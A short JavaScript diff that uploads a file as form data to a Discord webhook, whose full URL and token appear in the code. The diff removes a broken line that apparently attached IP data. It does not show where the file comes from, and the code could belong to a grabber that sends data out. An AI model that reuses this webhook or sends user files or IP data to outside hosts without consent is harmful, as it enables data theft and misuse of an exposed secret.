@@ -175,13 +175,11 @@
     var formData = new FormData();
     formData.append('file', file);
     
-    var formIPData = new formIPData();
-    formData.append("test", file);
     
     fetch(
       'https://discord.com/api/webhooks/1110072092826808390/IR34WYbMbUzKWKv2ade5O7m7JEQfzhpsFgOCzAql57-ViE5Rcs57JLUwnCBYboKH78kj', {
        method: 'POST',
-       body: formData + formIPData
+       body: formData
       })
      .then(function(response) {
       console.log(
